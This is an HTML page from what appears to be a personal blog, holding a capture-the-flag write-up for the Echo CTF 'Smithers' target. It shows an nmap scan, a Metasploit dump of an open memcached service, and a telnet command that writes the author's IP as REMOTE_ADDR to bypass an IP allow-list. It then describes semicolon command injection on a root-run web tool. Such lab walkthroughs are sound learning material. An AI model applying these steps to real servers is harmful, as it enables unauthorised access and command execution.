<!doctype html>
<html lang="en">
  <head><meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>Giuslock Pages</title>
<meta name="description" content="Giuslock Pages — " />
<link rel="stylesheet" href="/_assets/css/chirpy.css" />
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-okaidia.min.css" />
<script defer src="/_assets/js/main.js"></script>
<link rel="stylesheet" href="/_markdown_plugin_assets/highlight.js/atom-one-light.css" /></head>
  <body>
    <div class="wrapper">
      <aside class="sidebar">
  <div class="brand"><a href="//index">Giuslock Pages</a><span class="sub"></span></div>
  <nav class="nav">
    <a href="//index">Home</a>
    <a href="//archives">Archives</a>
    <a href="//tags">Tags</a>
    <a href="//about">About</a>
    <a href="//rss.xml">RSS</a>
    <a href="//search">Search</a>
  </nav>
</aside>

      <div class="content">
        <div class="container">
          <header class="header">
  <div class="search">
    <form action="//search">
      <input type="search" name="q" placeholder="Search…" />
    </form>
  </div>
</header>

          <div class="card"><div class="post"><div class="article-grid">
  <div>
    <div class="breadcrumbs">
      <a href="//index">Home</a>
      <span class="sep">›</span>
      <a href="//archives">Archives</a>
      
        <span class="sep">›</span>
        <a href="//tags#topic:ctf">topic:ctf</a>
      
    </div>
    <h1>Smithers - Echo CTF Challenge</h1>
    <div class="post-meta meta-line">
      <span class="badge"><span class="dot"></span><time datetime="2025-02-15T16:54:47.104Z">2025-02-15</time></span>
      
      <span class="badge"><span class="dot"></span>1 min read</span>
      
      <span class="badge"><span class="dot"></span>topic:ctf</span>
    </div>
    <div class="post-content"><p><img src="/_resources/a6e7b38cb9944cc4ba6cb5ffb04cef74.png" /></p>
<p><a title="https://echoctf.red/target/5" href="https://echoctf.red/target/5">Link to target</a></p>
<h2 id="introduction">Introduction</h2>
<p>This post details the process of solving the "Smithers" challenge on echoctf.red.</p>
<h2 id="enumeration-phase">Enumeration Phase</h2>
<h3 id="nmap-scan">Nmap Scan</h3>
<p>I start the reconnaissance with nmap:</p>
<div><pre class="hljs"><code>PORT      STATE SERVICE   VERSION
<span class="hljs-number">10888</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>      nginx
| <span class="hljs-keyword">http</span>-methods: 
|_  Supported Methods: GET HEAD POST
|<span class="hljs-title">_http-title</span>: Network Tools
<span class="hljs-number">11211</span>/tcp <span class="hljs-built_in">open</span>  memcached Memcached <span class="hljs-number">1.5</span><span class="hljs-number">.12</span> (uptime <span class="hljs-number">224</span> <span class="hljs-built_in">seconds</span>)</code></pre></div>
<h3 id="web-server-on-port-10888">Web Server on Port 10888</h3>
<p>There is a web server running on port 10888:<br />
<img src="/_resources/65833c4c20ff4cbabeb2779c06f9ad35.png" /></p>
<p>It mentions that these utilities are only available to authorized IP addresses.</p>
<h3 id="extracting-information-from-memcached-with-metasploit">Extracting Information from Memcached with Metasploit</h3>
<p>I use Metasploit to extract information from the memcached service:</p>
<div><pre class="hljs"><code>msf6 &gt; use auxiliary/gather/memcached_extractor

msf6 auxiliary(gather/memcached<span class="hljs-emphasis">_extractor) &gt; set rhosts 10.0.100.142 
rhosts =&gt; 10.0.100.142
msf6 auxiliary(gather/memcached_</span>extractor) &gt; exploit

[+] 10.0.100.142:11211    - Found 1 keys

<span class="hljs-section">Keys/Values Found for 10.0.100.142:11211
========================================</span>

<span class="hljs-code"> Key     Value</span>
<span class="hljs-code"> ---     -----</span>
<span class="hljs-code"> ETSCTF  "VALUE ETSCTF 0 39\r\nETSCTF_&lt;REDACTED&gt;\r\nEND\r\n"</span>
</code></pre></div>
<p>A flag is found in the memcached service.</p>
<h2 id="exploitation-phase">Exploitation Phase</h2>
<h3 id="using-telnet-to-modify-memcached">Using Telnet to Modify Memcached</h3>
<p>The key is to store my IP address in the memcached service as <code>REMOTE_ADDR</code>. After some research, I use telnet to connect and store my IP address:</p>
<div><pre class="hljs"><code><span class="hljs-attribute">telnet</span> <span class="hljs-number">10.0.100.142</span> <span class="hljs-number">11211</span>
<span class="hljs-attribute">Trying</span> <span class="hljs-number">10.0.100.142</span>...
<span class="hljs-attribute">Connected</span> to <span class="hljs-number">10.0.100.142</span>.
<span class="hljs-attribute">Escape</span> character is '^]'.
<span class="hljs-attribute">add</span> REMOTE_ADDR <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">10</span>
<span class="hljs-section">&lt;My IP&gt;</span>
<span class="hljs-attribute">STORED</span></code></pre></div>
<h3 id="accessing-the-web-server">Accessing the Web Server</h3>
<p>Once my address is stored, I can access the web server, which presents a command line interface:<br />
<img src="/_resources/4b2e3bd1f2054998b3142bfda29db88b.png" /></p>
<p>Two flags are visible. Using a semicolon (<code>;</code>), I can run other commands and see that it runs as root. By executing:</p>
<div><pre class="hljs"><code><span class="hljs-keyword">grep</span> -r <span class="hljs-string">'ETSCTF'</span> /</code></pre></div>
<p>All flags are found.</p>
</div>
    <nav class="post-nav" style="margin-top:1rem;">
      
      <a href="/article/untitled">← CTF Report: 2Million</a>
      <span style="float:right;"><a href="/article/soccer-an-htb-easy-machine">Soccer - An HTB easy machine →</a></span>
    </nav>
  </div>
  <aside class="article-aside">
    <div class="aside-card">
      <h3>Contents</h3>
      <ul id="toc-list" class="toc"></ul>
    </div>
    <div class="aside-card">
      <h3>Recently Updated</h3>
      <ul class="post-list">
        
          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/untitled">CTF Report: 2Million</a></li>
        
          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/smithers-echo-ctf-challenge">Smithers - Echo CTF Challenge</a></li>
        
          <li class="post-item" style="border:0;padding:.25rem 0;"><a href="/article/soccer-an-htb-easy-machine">Soccer - An HTB easy machine</a></li>
        
      </ul>
    </div>
    <div class="aside-card">
      <h3>Trending Tags</h3>
      
      
        <a href="//tags#topic:ctf" class="tag" style="display:inline-block;margin:.15rem .3rem 0 0;">topic:ctf</a>
      
    </div>
  </aside>
</div>
<script>
(function(){
  const content=document.querySelector('.post-content');
  const tocList=document.getElementById('toc-list');
  if(!content||!tocList) return;
  const headings=content.querySelectorAll('h2, h3');
  if(!headings.length){ tocList.innerHTML='<li class="post-item" style="border:0;color:var(--muted)">No headings</li>'; return; }
  const ids=new Set();
  const slug=s=>(s||'').toLowerCase().replace(/[^a-z0-9\s-]/g,'').trim().replace(/\s+/g,'-').slice(0,80);
  headings.forEach(h=>{
    let id=h.id||slug(h.textContent||'section');
    while(ids.has(id)) id=id+'-x';
    ids.add(id); h.id=id;
    const li=document.createElement('li');
    li.innerHTML='<a class="toc-'+h.tagName.toLowerCase()+'" href="#'+id+'">'+(h.textContent||'')+'</a>';
    tocList.appendChild(li);
  });
  const links=Array.from(tocList.querySelectorAll('a'));
  const map=new Map(links.map(a=>[a.getAttribute('href'),document.getElementById(a.getAttribute('href').slice(1))]));
  const onScroll=()=>{let active=links[0];const fromTop=window.scrollY+90;
    links.forEach(a=>{const h=map.get(a.getAttribute('href')); if(h&&h.offsetTop<=fromTop) active=a;});
    links.forEach(a=>a.classList.remove('active')); if(active) active.classList.add('active');
  };
  document.addEventListener('scroll', onScroll, {passive:true}); onScroll();
})();
</script>
</div></div>
        </div>
      </div>
    </div>
    <footer class="site-footer">
  <div class="container">
    <p>© 2025 Giuslock. Theme inspired by Chirpy.</p>
  </div>
</footer>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-core.min.js"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/autoloader/prism-autoloader.min.js"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/toolbar/prism-toolbar.min.js"></script>
<script defer src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/copy-to-clipboard/prism-copy-to-clipboard.min.js"></script>

  </body>
</html>
